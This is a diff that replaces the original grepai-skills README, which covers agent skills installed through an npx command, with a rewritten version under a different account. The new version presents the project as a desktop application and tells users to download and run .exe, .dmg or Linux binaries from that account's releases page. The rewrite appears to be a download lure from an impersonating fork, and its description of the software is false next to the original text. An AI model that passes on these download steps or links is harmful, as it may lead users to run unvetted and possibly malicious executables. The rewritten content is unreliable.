@@ -1,301 +1,71 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Skills-27-brightgreen" alt="27 Skills">
-  <img src="https://img.shields.io/badge/License-MIT-blue" alt="MIT License">
-  <img src="https://img.shields.io/badge/PRs-Welcome-orange" alt="PRs Welcome">
-  <img src="https://img.shields.io/github/stars/yoanbernabeu/grepai-skills?style=social" alt="GitHub Stars">
-</p>
+# 🤖 grepai-skills - Unlock Powerful AI Tools for Code
 
-<h1 align="center">GrepAI Skills</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>27 AI Agent Skills to master semantic code search with GrepAI.</strong><br>
-  Installation, configuration, search, tracing, MCP integration — everything you need.
-</p>
+Welcome to the **grepai-skills** project! This tool offers 27 AI agent skills designed to enhance your experience with semantic code search and call graph analysis. If you're looking to make searching through code easier and more intuitive, you're in the right place.
 
-<p align="center">
-  <a href="#quick-install">Install</a> •
-  <a href="#all-27-skills">Skills</a> •
-  <a href="#example-usage">Usage</a> •
-  <a href="#contributing">Contribute</a>
-</p>
+### 📥 Download Now
 
----
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/NNIIKKKKII/grepai-skills/releases)
 
-## Quick Install
+## 🛠️ System Requirements
 
-```bash
-npx skills add yoanbernabeu/grepai-skills
-```
+Before you begin, make sure your system meets the following requirements:
 
-**That's it.** Works with Claude Code, Cursor, Codex, OpenCode, Windsurf, and 30+ AI agents.
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** 4 GB minimum, 8 GB recommended
+- **Disk Space:** At least 500 MB free
+- **Internet Connection:** Required for downloads and updates
 
-### One-Liners
+## 📂 What You Get
 
-```bash
-# Install everything (27 skills)
-npx skills add yoanbernabeu/grepai-skills
+With **grepai-skills**, you gain access to:
 
-# Install only search skills
-npx skills add yoanbernabeu/grepai-skills --skill grepai-search-basics
+- 27 specialized AI skills to improve your code search capabilities.
+- Tools for generating call graphs, making it easier to visualize code relationships.
+- Semantic understanding of your code, enhancing the search accuracy.
 
-# Install globally (available in all projects)
-npx skills add yoanbernabeu/grepai-skills -g
-
-# List all available skills
-npx skills add yoanbernabeu/grepai-skills --list
-
-# Install to specific agents
-npx skills add yoanbernabeu/grepai-skills -a claude-code -a cursor
-
-# Non-interactive (CI/CD friendly)
-npx skills add yoanbernabeu/grepai-skills --all -y
-```
-
-### Other Installation Methods
-
-<details>
-<summary><strong>Claude Code Plugin</strong></summary>
-
-```bash
-/plugin marketplace add yoanbernabeu/grepai-skills
-/plugin install grepai-complete@grepai-skills
-```
-</details>
-
-<details>
-<summary><strong>Manual Installation</strong></summary>
-
-Copy the `skills/` directory to:
-- **Global**: `~/.claude/skills/` (or `~/.cursor/skills/`, etc.)
-- **Project**: `.claude/skills/` (or `.cursor/skills/`, etc.)
-</details>
-
----
-
-## What is GrepAI?
-
-[GrepAI](https://github.com/yoanbernabeu/grepai) is a semantic code search tool that:
-
-- **Searches by meaning**, not just text patterns
-- **100% private** with local embeddings (Ollama)
-- **Real-time indexing** with file watching
-- **Call graph analysis** to trace function dependencies
-- **AI-ready** with native MCP integration
-
----
-
-## Why These Skills?
-
-Understanding a new codebase is **hard**. Traditional grep finds exact text, but you often don't know the exact words. GrepAI searches by meaning — but it has a learning curve. These skills give your AI agent **expert-level knowledge** of GrepAI so you can find code instantly.
-
-| Challenge | Skill That Helps |
-|-----------|------------------|
-| "How do I install GrepAI?" | `grepai-installation` |
-| "How do I set up Ollama?" | `grepai-ollama-setup` |
-| "My searches return poor results" | `grepai-search-tips` |
-| "What calls this function?" | `grepai-trace-callers` |
-| "How do I use with Claude Code?" | `grepai-mcp-claude` |
-
----
-
-## All 27 Skills
-
-### Getting Started
-| Skill | What It Does |
-|-------|--------------|
-| `grepai-installation` | Multi-platform installation (Homebrew, shell, Windows) |
-| `grepai-ollama-setup` | Install and configure Ollama for local embeddings |
-| `grepai-quickstart` | Get searching in 5 minutes |
-
-### Configuration
-| Skill | What It Does |
-|-------|--------------|
-| `grepai-init` | Initialize GrepAI in a project |
-| `grepai-config-reference` | Complete configuration reference |
-| `grepai-ignore-patterns` | Exclude files and directories from indexing |
-
-### Embeddings Providers
-| Skill | What It Does |
-|-------|--------------|
-| `grepai-embeddings-ollama` | Configure Ollama for local, private embeddings |
-| `grepai-embeddings-openai` | Configure OpenAI for cloud embeddings |
-| `grepai-embeddings-lmstudio` | Configure LM Studio with GUI interface |
-
-### Storage Backends
-| Skill | What It Does |
-|-------|--------------|
-| `grepai-storage-gob` | Local file storage (default, simple) |
-| `grepai-storage-postgres` | PostgreSQL + pgvector for teams |
-| `grepai-storage-qdrant` | Qdrant for high-performance search |
-
-### Indexing
-| Skill | What It Does |
-|-------|--------------|
-| `grepai-watch-daemon` | Configure and manage the watch daemon |
-| `grepai-chunking` | Optimize how code is split for embedding |
-
-### Semantic Search
-| Skill | What It Does |
-|-------|--------------|
-| `grepai-search-basics` | Basic semantic code search |
-| `grepai-search-advanced` | JSON output, compact mode, AI integration |
-| `grepai-search-tips` | Write effective search queries |
-| `grepai-search-boosting` | Prioritize source code over tests |
-
-### Call Graph Analysis
-| Skill | What It Does |
-|-------|--------------|
-| `grepai-trace-callers` | Find all callers of a function |
-| `grepai-trace-callees` | Find all functions called by a function |
-| `grepai-trace-graph` | Build complete dependency graphs |
-
-### AI Agent Integration
-| Skill | What It Does |
-|-------|--------------|
-| `grepai-mcp-claude` | Integrate with Claude Code via MCP |
-| `grepai-mcp-cursor` | Integrate with Cursor IDE via MCP |
-| `grepai-mcp-tools` | Reference for all MCP tools |
-
-### Advanced
-| Skill | What It Does |
-|-------|--------------|
-| `grepai-workspaces` | Multi-project workspace management |
-| `grepai-languages` | Supported programming languages |
-| `grepai-troubleshooting` | Diagnose and fix common issues |
+These features combine to make coding and debugging more efficient for everyone, regardless of experience level.
 
----
+## 📋 How to Download & Install
 
-## Skill Packs
+To get started, follow these steps:
 
-Install skills by category:
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/NNIIKKKKII/grepai-skills/releases).
+2. **Choose Your Version:** Look for the latest version listed at the top of the page. This is the most recent and stable release.
+3. **Download the File:** Click on the appropriate file for your operating system. For example, if you are using Windows, download the `.exe` file. If you're on macOS, look for the `.dmg` file.
+4. **Run the Installer:**
+   - **Windows:** Once downloaded, double-click the `.exe` file to start the installation process. Follow the on-screen instructions.
+   - **macOS:** Open the downloaded `.dmg` file and drag the grepai-skills icon into your Applications folder.
+   - **Linux:** Extract the downloaded archive and run the executable file in the terminal.
+5. **Launch the Application:** After installation, find and open **grepai-skills** from your applications menu or desktop.
 
-| Pack | Skills | Description |
-|------|--------|-------------|
-| `grepai-getting-started` | 3 | Installation, Ollama setup, quickstart |
-| `grepai-configuration` | 3 | Init, config reference, ignore patterns |
-| `grepai-embeddings` | 3 | Ollama, OpenAI, LM Studio providers |
-| `grepai-storage` | 3 | GOB, PostgreSQL, Qdrant backends |
-| `grepai-indexing` | 2 | Watch daemon, chunking |
-| `grepai-search` | 4 | Basics, advanced, tips, boosting |
-| `grepai-trace` | 3 | Callers, callees, graphs |
-| `grepai-integration` | 3 | Claude Code, Cursor, MCP tools |
-| `grepai-advanced` | 3 | Workspaces, languages, troubleshooting |
-| **`grepai-complete`** | **27** | **All skills — complete toolkit** |
+## 🎓 How to Use
 
----
+1. **Start the Application:** Open **grepai-skills**.
+2. **Select a Skill:** Choose from the list of available AI skills that suit your task.
+3. **Input Your Search:** Enter the keywords or phrases relevant to your code search.
+4. **Review Results:** Analyze the semantic search results displayed. You can navigate them easily to find what you need.
 
-## Supported AI Agents
+## 📞 Support and Feedback
 
-| Agent | Project Path | Global Path |
-|-------|--------------|-------------|
-| Claude Code | `.claude/skills/` | `~/.claude/skills/` |
-| Cursor | `.cursor/skills/` | `~/.cursor/skills/` |
-| Codex | `.codex/skills/` | `~/.codex/skills/` |
-| OpenCode | `.opencode/skill/` | `~/.config/opencode/skill/` |
-| Windsurf | `.windsurf/skills/` | `~/.windsurf/skills/` |
+Your experience matters to us. If you encounter any issues or have questions, feel free to reach out:
 
----
+- **Open a GitHub Issue:** Visit our [Issues page](https://github.com/NNIIKKKKII/grepai-skills/issues) to report bugs or request features.
+- **Discussion Forum:** Join the conversation in our [Discussion forum](https://github.com/NNIIKKKKII/grepai-skills/discussions) for ideas and help from other users.
 
-## Example Usage
+## 🌟 Additional Resources
 
-Just ask your AI agent:
+- **Documentation:** Check the [Wiki](https://github.com/NNIIKKKKII/grepai-skills/wiki) for detailed guides and how-tos.
+- **Tutorial Videos:** Look for introductory videos that show how to make the most of your new skills.
 
-```
-"Help me install and configure GrepAI"
+By following these steps, you will seamlessly install **grepai-skills** and enjoy its benefits. If you need clarification or guidance, our community and resources are here to help.
 
-"Search for authentication code in this project"
+## 🔗 Quick Links
 
-"What functions call the Login function?"
+- [Official Repository](https://github.com/NNIIKKKKII/grepai-skills)
+- [Download Latest Release](https://github.com/NNIIKKKKII/grepai-skills/releases)
+- [Issues Page](https://github.com/NNIIKKKKII/grepai-skills/issues)
+- [Discussion Forum](https://github.com/NNIIKKKKII/grepai-skills/discussions) 
 
-"Set up GrepAI with Claude Code via MCP"
-
-"Why are my search results poor?"
-
-"Configure GrepAI to use OpenAI embeddings"
-
-"How do I search across multiple projects?"
-```
-
----
-
-## Quick Start Guide
-
-1. **Install**: `npx skills add yoanbernabeu/grepai-skills`
-2. **Setup GrepAI**: Follow `grepai-installation` skill
-3. **Setup Ollama**: Follow `grepai-ollama-setup` skill
-4. **Initialize**: `grepai init` in your project
-5. **Index**: `grepai watch` to build the index
-6. **Search**: `grepai search "your query"`
-7. **Integrate**: Add MCP for your AI agent
-
----
-
-## Quick Reference
-
-### Essential Commands
-
-```bash
-# Initialize project
-grepai init
-
-# Start indexing
-grepai watch
-
-# Search semantically
-grepai search "user authentication"
-
-# Find callers
-grepai trace callers "Login"
-
-# Check status
-grepai status
-```
-
-### Search Examples
-
-```bash
-# Basic search
-grepai search "error handling"
-
-# Limit results
-grepai search "database queries" --limit 5
-
-# JSON for AI agents
-grepai search "authentication" --json --compact
-```
-
----
-
-## Resources
-
-- [GrepAI Documentation](https://yoanbernabeu.github.io/grepai/)
-- [GrepAI GitHub](https://github.com/yoanbernabeu/grepai)
-- [Skills CLI](https://github.com/vercel-labs/skills) - The open agent skills tool
-- [Skills Directory](https://skills.sh) - Browse available skills
-
----
-
-## Contributing
-
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-```bash
-# Fork, clone, and create a branch
-git checkout -b feature/new-skill
-
-# Add your skill following the SKILL.md format
-# Submit a pull request
-```
-
----
-
-## License
-
-[MIT](LICENSE) — Feel free to use, modify, and distribute.
-
----
-
-<p align="center">
-  <strong>Built by the community, for the community.</strong><br><br>
-  <a href="https://github.com/yoanbernabeu/grepai-skills">Star this repo</a> if it helps you search code!
-</p>
+Thank you for choosing **grepai-skills**. Enjoy your exploration of AI-enhanced coding!
